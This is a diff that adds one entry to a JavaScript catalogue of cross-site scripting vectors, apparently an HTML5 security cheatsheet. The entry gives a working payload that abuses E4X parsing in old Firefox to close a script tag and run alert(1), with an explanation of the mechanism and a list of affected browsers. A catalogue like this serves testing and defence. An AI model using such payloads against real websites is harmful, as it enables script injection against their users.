@@ -1801,5 +1801,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'nesting', 'script', 'parser', 'regex'],
         'reporter'   : '.mario, Kyo, sdc'
+    },
+    { /* ID 58 - E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time */
+        'id'         : 58,
+        'category'   : 'e4x', 
+        'name'       : {
+            'en' : 'E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<b<script<b/><alert(1)//</script>0',
+        'description': {
+            'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparision (<b/> < alert(1)).',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['https://developer.mozilla.org/en/E4X'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'firefox': ['1.5', '2.x', '3.x'],
+        },
+        'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
+        'reporter'   : '.mario'
     }
 ]
